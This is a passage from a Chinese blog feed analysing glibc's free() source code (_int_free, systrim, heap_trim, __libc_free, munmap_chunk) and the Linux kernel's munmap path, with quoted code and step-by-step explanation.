(!in_smallbin_range(size)) &#123;</div><div class="line">                p-&gt;fd_nextsize = NULL;</div><div class="line">                p-&gt;bk_nextsize = NULL;</div><div class="line">            &#125;</div><div class="line">            bck-&gt;fd = p;</div><div class="line">            fwd-&gt;bk = p;</div><div class="line"></div><div class="line">            set_head(p, size | PREV_INUSE);</div><div class="line">            set_foot(p, size);</div><div class="line"></div><div class="line">            check_free_chunk(av, p);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        else &#123;</div><div class="line">            size += nextsize;</div><div class="line">            set_head(p, size | PREV_INUSE);</div><div class="line">            av-&gt;top = p;</div><div class="line">            check_chunk(av, p);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果将要释放的chunk不属于fastbin，且不是由mmap分配的，就首先获得下一个chunk的指针<code>nextchunk</code>和大小<code>nextsize</code>，如果前一个chunk空闲，就和前一个chunk合并，并通过<code>unlink</code>将该chunk从空闲链表中脱离。接下来，如果刚才前面取出的下一个chunk也为空闲，并且该chunk不是top chunk，则继续合并，否则将其设为空闲。再往下，就是取出unsortedbin的头指针，将合并后的chunk插入unsortedbin链表头部，并进行相应的设置。<br>如果下一个chunk为top chunk，就将要释放的chunk合并到top chunk中。</p>
<h2 id="int-free第三部分"><a href="#int-free第三部分" class="headerlink" title="_int_free第三部分"></a>_int_free第三部分</h2><p>继续往下看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else if (!chunk_is_mmapped(p)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</div><div class="line">            if (have_fastchunks(av))</div><div class="line">                malloc_consolidate(av);</div><div class="line"></div><div class="line">            if (av == &amp;main_arena) &#123;</div><div class="line">    #ifndef MORECORE_CANNOT_TRIM</div><div class="line">                if ((unsigned long) (chunksize(av-&gt;top))</div><div class="line">                        &gt;= (unsigned long) (mp_.trim_threshold))</div><div class="line">                    systrim(mp_.top_pad, av);</div><div class="line">    #endif</div><div class="line">            &#125; else &#123;</div><div class="line">                heap_info *heap = heap_for_ptr(top(av));</div><div class="line">                heap_trim(heap, mp_.top_pad);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        if (!have_lock) &#123;</div><div class="line">            assert(locked);</div><div class="line">            (void) mutex_unlock(&amp;av-&gt;mutex);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        munmap_chunk(p);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果前面释放的chunk比较大，就需要做一些处理了。首先对fastbin中的chunk进行合并并添加到unsortedbin中。然后，如果是主分配区，并且主分配区的top chunk大于一定的值，就通过<code>systrim</code>缩小top chunk。如果是非主分配区，就获得top chunk对应的非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>尝试缩小该heap。后面来看<code>systrim</code>和<code>heap_trim</code>这两个函数。<br>最后，说明chunk还是通过mmap分配的，就调用<code>munmap_chunk</code>释放它。<code>munmap_chunk</code>函数已经在上一章介绍了。</p>
<h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h2><p><code>systrim</code>用于缩小主分配区的top chunk大小，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">static int systrim(size_t pad, mstate av) &#123;</div><div class="line">    long top_size;</div><div class="line">    long extra;</div><div class="line">    long released;</div><div class="line">    char *current_brk;</div><div class="line">    char *new_brk;</div><div class="line">    size_t pagesize;</div><div class="line">    long top_area;</div><div class="line"></div><div class="line">    pagesize = GLRO(dl_pagesize);</div><div class="line">    top_size = chunksize(av-&gt;top);</div><div class="line"></div><div class="line">    top_area = top_size - MINSIZE - 1;</div><div class="line">    if (top_area &lt;= pad)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    extra = (top_area - pad) &amp; ~(pagesize - 1);</div><div class="line"></div><div class="line">    if (extra == 0)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    current_brk = (char *) (MORECORE(0));</div><div class="line">    if (current_brk == (char *) (av-&gt;top) + top_size) &#123;</div><div class="line"></div><div class="line">        MORECORE(-extra);</div><div class="line">        void (*hook)(void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">        if (__builtin_expect(hook != NULL, 0))</div><div class="line">            (*hook)();</div><div class="line">        new_brk = (char *) (MORECORE(0));</div><div class="line"></div><div class="line">        LIBC_PROBE (memory_sbrk_less, 2, new_brk, extra);</div><div class="line"></div><div class="line">        if (new_brk != (char *) MORECORE_FAILURE) &#123;</div><div class="line">            released = (long) (current_brk - new_brk);</div><div class="line"></div><div class="line">            if (released != 0) &#123;</div><div class="line">                av-&gt;system_mem -= released;</div><div class="line">                set_head(av-&gt;top, (top_size - released) | PREV_INUSE);</div><div class="line">                check_malloc_state (av);</div><div class="line">                return 1;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，如果主分配区的top chunk本来就没什么空间，就直接返回，否则就将主分配区中可以缩小的大小保存在<code>extra</code>中。下面检查当前堆的<code>brk</code>指针是否和top chunk的结束地址相等，如果相等就可以通过<code>MORECORE</code>降低堆的大小，<code>MORECORE</code>是brk的系统调用，最后也是通过<code>do_munmap</code>释放虚拟内存的。<code>__after_morecore_hook</code>函数指针为空，不管它。再下来，获得释放后的堆指针保存在<code>new_brk</code>中，计算释放的虚拟内存的大小<code>released</code>，并将该信息更新到主分配区中，然后设置新top chunk的<code>size</code>。</p>
<h2 id="heap-trim"><a href="#heap-trim" class="headerlink" title="heap_trim"></a>heap_trim</h2><p><code>heap_trim</code>用来缩小非主分配区的heap大小，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">static int</div><div class="line">internal_function heap_trim(heap_info *heap, size_t pad) &#123;</div><div class="line">    mstate ar_ptr = heap-&gt;ar_ptr;</div><div class="line">    unsigned long pagesz = GLRO(dl_pagesize);</div><div class="line">    mchunkptr top_chunk = top(ar_ptr), p, bck, fwd;</div><div class="line">    heap_info *prev_heap;</div><div class="line">    long new_size, top_size, top_area, extra, prev_size, misalign;</div><div class="line"></div><div class="line">    while (top_chunk == chunk_at_offset(heap, sizeof(*heap))) &#123;</div><div class="line">        prev_heap = heap-&gt;prev;</div><div class="line">        prev_size = prev_heap-&gt;size - (MINSIZE - 2 * SIZE_SZ);</div><div class="line">        p = chunk_at_offset(prev_heap, prev_size);</div><div class="line">        misalign = ((long) p) &amp; MALLOC_ALIGN_MASK;</div><div class="line">        p = chunk_at_offset(prev_heap, prev_size - misalign);</div><div class="line">        p = prev_chunk(p);</div><div class="line">        new_size = chunksize(p) + (MINSIZE - 2 * SIZE_SZ) + misalign;</div><div class="line">        if (!prev_inuse(p))</div><div class="line">            new_size += p-&gt;prev_size;</div><div class="line">        if (new_size + (HEAP_MAX_SIZE - prev_heap-&gt;size)</div><div class="line">                &lt; pad + MINSIZE + pagesz)</div><div class="line">            break;</div><div class="line">        ar_ptr-&gt;system_mem -= heap-&gt;size;</div><div class="line">        arena_mem -= heap-&gt;size;</div><div class="line">        delete_heap(heap);</div><div class="line">        heap = prev_heap;</div><div class="line">        if (!prev_inuse(p))&#123;</div><div class="line">            p = prev_chunk(p);</div><div class="line">            unlink(ar_ptr, p, bck, fwd);</div><div class="line">        &#125;</div><div class="line">        top (ar_ptr) = top_chunk = p;</div><div class="line">        set_head(top_chunk, new_size | PREV_INUSE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    top_size = chunksize(top_chunk);</div><div class="line">    top_area = top_size - MINSIZE - 1;</div><div class="line">    if (top_area &lt; 0 || (size_t) top_area &lt;= pad)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    extra = ALIGN_DOWN(top_area - pad, pagesz);</div><div class="line">    if ((unsigned long) extra &lt; mp_.trim_threshold)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    if (shrink_heap(heap, extra) != 0)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    ar_ptr-&gt;system_mem -= extra;</div><div class="line">    arena_mem -= extra;</div><div class="line"></div><div class="line">    set_head(top_chunk, (top_size - extra) | PREV_INUSE);</div><div class="line">    return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一个while表示，如果top chunk指针正好在<code>heap_info</code>上，则考虑删掉整个heap。这是因为此时，该heap只有一个top chunk。再删掉该heap之前，需要检查该heap的前一个heap是否有足够的空间，否则删掉该heap后，剩余的空间太小。<br>经过计算后，<code>newsize</code>保存了前一个heap高地址处的fencepost和前一个空闲chunk（如果存在）的总大小组成，如果<code>newsize</code>加上该heap还未使用的内存（<code>HEAP_MAX_SIZE - prev_heap-&gt;size</code>）太小，就<code>break</code>退出循环，取消对整个heap的释放。否则，在更新了相应的信息后，调用<code>delete_heap</code>删除整个heap，<code>delete_heap</code>是一个宏，定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define delete_heap(heap) \</div><div class="line">  do &#123;                                        \</div><div class="line">      if ((char *) (heap) + HEAP_MAX_SIZE == aligned_heap_area)           \</div><div class="line">        aligned_heap_area = NULL;                         \</div><div class="line">      __munmap ((char *) (heap), HEAP_MAX_SIZE);                  \</div><div class="line">    &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>delete_heap</code>其最终通过<code>__munmap</code>释放整个heap，大小为<code>HEAP_MAX_SIZE</code>。<br>删除掉整个heap后，如果前一个heap的fencepost的前面有一个空闲chunk，就将该空闲chunk从空闲链表中脱离，然后设置fencepost或者该空闲chunk（如果存在）的地址为新的top chunk，该top chunk的大小为前面计算的<code>new_size</code>。<br>然后返回<code>while</code>继续检查，如果新的top chunk指针又正好在<code>heap_info</code>上，就表示该heap也就只有一个chunk即top chunk，就继续释放该heap。<br>再往下，如果新的top chunk剩余空间<code>top_area</code>太小，就直接返回了。如果还有足够的空间，且<code>top_area</code>大于收缩阀值，就调用<code>shrink_heap</code>进一步将新的top chunk的大小减少<code>extra</code>。最后设置一些分配区的信息，并设置减少后的top chunk的大小为<code>top_size - extra</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">static int shrink_heap(heap_info *h, long diff) &#123;</div><div class="line">    long new_size;</div><div class="line"></div><div class="line">    new_size = (long) h-&gt;size - diff;</div><div class="line">    if (new_size &lt; (long) sizeof(*h))</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    h-&gt;size = new_size;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里其实就是减小<code>heap_info</code>的<code>size</code>变量。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面对整个<code>_int_free</code>函数做个总结。<br>首先检查将要释放的chunk是否属于fastbin，如果属于就将其添加到fastbin中。<br>然后检查该chunk是否是由mmap分配的，如果不是，就根据其下一个chunk的类型添加到unsortedbin或者合并到top chunk中。<br>接着，如果释放的chunk的大小大于一定的阀值，就需要通过<code>systrim</code>缩小主分配区的大小，或者通过<code>heap_trim</code>缩小非主分配区的大小。<br>最后如果该chunk是由mmap的分配的，通过<code>munmap_chunk</code>释放。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;free源码分析—-int-free&quot;&gt;&lt;a href=&quot;#free源码分析—-int-free&quot; class=&quot;headerlink&quot; title=&quot;free源码分析—_int_free&quot;&gt;&lt;/a&gt;free源码分析—_int_free&lt;/h1&gt;&lt;p&gt;根据上一章的
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>free源码分析——1</title>
    <link href="http://yoursite.com/2018/05/21/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/"/>
    <id>http://yoursite.com/2018/05/21/free源码分析——1/</id>
    <published>2018-05-21T06:44:59.000Z</published>
    <updated>2018-05-21T06:55:47.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="free源码分析—-libc-free"><a href="#free源码分析—-libc-free" class="headerlink" title="free源码分析—__libc_free"></a>free源码分析—__libc_free</h1><p>本章继续之前的glibc中的《malloc源码分析》系列开始分析free的源代码，malloc的源码分析可以查看博客里同类别文章下的《malloc源码分析—1》到《malloc源码分析—5》，因此free的源码中有一些结构和malloc相似的地方就不会做过多的介绍了。</p>
<p>首先在glibc的malloc.c中有如下定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">strong_alias( __libc_free, __cfree)</div><div class="line">weak_alias( __libc_free, cfree)</div><div class="line">strong_alias( __libc_free, __free)</div><div class="line">strong_alias( __libc_free, free)</div></pre></td></tr></table></figure>
<p>因此，<code>free</code>是<code>__libc_free</code>的别名，实际执行的是<code>__libc_free</code>函数，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">void __libc_free(void *mem) &#123;</div><div class="line">    mstate ar_ptr;</div><div class="line">    mchunkptr p;</div><div class="line"></div><div class="line">    void (*hook)(void *, const void *) = atomic_forced_read (__free_hook);</div><div class="line">    if (__builtin_expect(hook != NULL, 0)) &#123;</div><div class="line">        (*hook)(mem, RETURN_ADDRESS(0));</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (mem == 0)</div><div class="line">        return;</div><div class="line"></div><div class="line">    p = mem2chunk(mem);</div><div class="line"></div><div class="line">    if (chunk_is_mmapped(p))&#123;</div><div class="line">        if (!mp_.no_dyn_threshold</div><div class="line">                &amp;&amp; p-&gt;size</div><div class="line">                        &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</div><div class="line">            mp_.mmap_threshold = chunksize(p);</div><div class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;</div><div class="line">            LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,</div><div class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">        munmap_chunk(p);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ar_ptr = arena_for_chunk(p);</div><div class="line">    _int_free(ar_ptr, p, 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__libc_free</code>首先查看是否有<code>__free_hook</code>函数，如果有就直接调用，这里假设没有默认函数可用。接下来通过<code>mem2chunk</code>将虚拟内存的指针<code>mem</code>转换为对应的chunk指针<code>p</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</div></pre></td></tr></table></figure>
<p>因为一个使用中的chunk结构体只使用其<code>prev_size</code>和<code>size</code>字段，因此这里只需要减去<code>2*SIZE_SZ</code>。<br>接下来，<code>chunk_is_mmapped</code>用来检查size最低三位中的标志位，判断该chunk是否是由mmap分配的，如果是，就调用<code>munmap_chunk</code>释放该chunk并返回，在调用<code>munmap_chunk</code>之前，需要更新全局的mmap阀值和收缩阀值。<br>再往下，如果该chunk不是由mmap分配的，就通过<code>arena_for_chunk</code>获得分配区指针<code>ar_ptr</code>，并调用<code>_int_free</code>释放内存。<code>_int_free</code>放在下一章分析，本章重点分析<code>munmap_chunk</code>函数。</p>
<h2 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h2><p>munmap_chunk用来释放由mmap分配的chunk，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">static void internal_function munmap_chunk(mchunkptr p) &#123;</div><div class="line">    INTERNAL_SIZE_T size = chunksize(p);</div><div class="line"></div><div class="line">    assert(chunk_is_mmapped (p));</div><div class="line"></div><div class="line">    uintptr_t block = (uintptr_t) p - p-&gt;prev_size;</div><div class="line">    size_t total_size = p-&gt;prev_size + size;</div><div class="line"></div><div class="line">    if (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - 1)) != 0,</div><div class="line">            0)) &#123;</div><div class="line">        malloc_printerr(check_action, &quot;munmap_chunk(): invalid pointer&quot;,</div><div class="line">                chunk2mem(p), NULL);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    atomic_decrement(&amp;mp_.n_mmaps);</div><div class="line">    atomic_add(&amp;mp_.mmapped_mem, -total_size);</div><div class="line"></div><div class="line">    __munmap((char *) block, total_size);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先获得前一个chunk的指针<code>block</code>，计算这两个chunk的<code>size</code>之和至<code>total_size</code>，接着对全局结构<code>mp_</code>进行相应的设置后，就通过<code>__munmap</code>释放这两个chunk。根据malloc的源码可知，由mmap分配的chunk是独立的，大部分情况下，<code>p-&gt;prev_size</code>为0，因此这里还是释放一个chunk，特殊情况下需要释放两个chunk，特殊情况请参考<code>_int_malloc</code>中的代码。<br><code>__munmap</code>再往下就是系统调用了，定义在linux内核代码的mmap.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE2(munmap, unsigned long, addr, size_t, len)&#123;</div><div class="line"></div><div class="line">    profile_munmap(addr);</div><div class="line">    return vm_munmap(addr, len);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>profile_munmap</code>为空函数，下面看vm_munmap，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int vm_munmap(unsigned long start, size_t len)&#123;</div><div class="line"></div><div class="line">    int ret;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line"></div><div class="line">    down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    ret = do_munmap(mm, start, len);</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    return ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是信号量的操作，最主要是执行<code>do_munmap</code>释放内存，为了方便分析和查看，只复制了<code>do_munmap</code>的关键代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">int do_munmap(struct mm_struct *mm, unsigned long start, size_t len)&#123;</div><div class="line"></div><div class="line">    unsigned long end;</div><div class="line">    struct vm_area_struct *vma, *prev, *last;</div><div class="line"></div><div class="line">    if ((start &amp; ~PAGE_MASK) || start &gt; TASK_SIZE || len &gt; TASK_SIZE-start)</div><div class="line">        return -EINVAL;</div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line"></div><div class="line">    vma = find_vma(mm, start);</div><div class="line">    prev = vma-&gt;vm_prev;</div><div class="line">    end = start + len;</div><div class="line">    if (vma-&gt;vm_start &gt;= end)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    if (start &gt; vma-&gt;vm_start) &#123;</div><div class="line">        int error;</div><div class="line"></div><div class="line">        if (end &lt; vma-&gt;vm_end &amp;&amp; mm-&gt;map_count &gt;= sysctl_max_map_count)</div><div class="line">            return -ENOMEM;</div><div class="line"></div><div class="line">        error = __split_vma(mm, vma, start, 0);</div><div class="line">        if (error)</div><div class="line">            return error;</div><div class="line">        prev = vma;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    last = find_vma(mm, end);</div><div class="line">    if (last &amp;&amp; end &gt; last-&gt;vm_start) &#123;</div><div class="line">        int error = __split_vma(mm, last, end, 1);</div><div class="line">        if (error)</div><div class="line">            return error;</div><div class="line">    &#125;</div><div class="line">    vma = prev ? prev-&gt;vm_next : mm-&gt;mmap;</div><div class="line"></div><div class="line">    detach_vmas_to_be_unmapped(mm, vma, prev, end);</div><div class="line">    unmap_region(mm, vma, prev, start, end);</div><div class="line">    arch_unmap(mm, vma, start, end);</div><div class="line">    remove_vma_list(mm, vma);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先对传入的参数进行检查，需要释放的虚拟内存的开始地址<code>start</code>和长度<code>len</code>必须按页对齐，且不能释放内核空间的内存。<br>接着通过<code>find_vma</code>在进程的管理内存的AVL树上查找第一个结束地址大于<code>start</code>的虚拟内存<code>vma</code>，如果<code>vma-&gt;vm_start &gt;= end</code>，说明需要释放的虚拟内存本来就不存在，因此什么也不做返回；如果<code>start &gt; vma-&gt;vm_start</code>，则表示找到的<code>vma</code>包含了需要释放的内存，这时候通过<code>__split_vma</code>函数将该<code>vma</code>根据<code>start</code>地址划分成两块，因此需要判断虚拟内存的数量是否超过了系统的限制<code>sysctl_max_map_count</code>。为了方便分析，下面只给出了<code>__split_vma</code>的几行关键代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">static int __split_vma(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">          unsigned long addr, int new_below)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *new;</div><div class="line">    new = kmem_cache_alloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    *new = *vma;</div><div class="line"></div><div class="line">    if (new_below)</div><div class="line">        new-&gt;vm_end = addr;</div><div class="line">    else &#123;</div><div class="line">        new-&gt;vm_start = addr;</div><div class="line">        new-&gt;vm_pgoff += ((addr - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (new_below)</div><div class="line">        err = vma_adjust(vma, addr, vma-&gt;vm_end, vma-&gt;vm_pgoff +</div><div class="line">            ((addr - new-&gt;vm_start) &gt;&gt; PAGE_SHIFT), new);</div><div class="line">    else</div><div class="line">        err = vma_adjust(vma, vma-&gt;vm_start, addr, vma-&gt;vm_pgoff, new);</div><div class="line"></div><div class="line">    if (!err)</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先分配一个<code>vm_area_struct</code>结构体<code>new</code>，然后将<code>vma</code>中的所有内容拷贝到<code>new</code>中，<code>new_below</code>决定将原<code>vma</code>按照<code>addr</code>决定的地址分割成两个后，<code>vma</code>中保存低地址部分还是高地址部分。<code>do_munmap</code>第一次进入<code>__split_vma</code>时<code>new_below</code>为0，因此返回的<code>vma</code>保存低地址部分。然后调用<code>vma_adjust</code>对低地址部分的<code>vma</code>进行相应的设置，主要是更改其<code>end</code>变量为<code>addr</code>，并将高地址部分插入进程内存的管理树中。</p>
<p>回到<code>do_munmap</code>中，<code>find_vma(mm, end)</code>获得最尾部的<code>last</code>，如果该<code>last</code>包含了需要释放的虚拟内存，就继续将其拆成两部分，这时候由于<code>new_below</code>为1，因此返回的<code>last</code>为高地址部分。返回后，<code>vma</code>将指向低地址部分。</p>
<p>结合前面的分析，在执行<code>detach_vmas_to_be_unmapped</code>之前，原来的vma被拆成如下所示<br>| prev | vma | … | vma | last |<br><code>mm-&gt;mmap</code>的赋值是在<code>vma_adjust</code>中，其实就是拆分后低地址处那块虚拟内存。<br>接下来<code>detach_vmas_to_be_unmapped</code>用于将所有和要释放的内存有交集的<code>vma</code>从红黑树中删除，并形成一个以<code>vma</code>为链表头的链表。根据刚刚<code>vma</code>被拆开成的结果，其实就是取数组中所有除了<code>prev</code>和<code>last</code>的元素构成一个链表。即<br>| prev | vma | … | vma | last |<br>经过<code>detach_vmas_to_be_unmapped</code>后变成，<br>| prev| last |<br>| vma | … | vma |<br>往下就是要释放第二部分。</p>
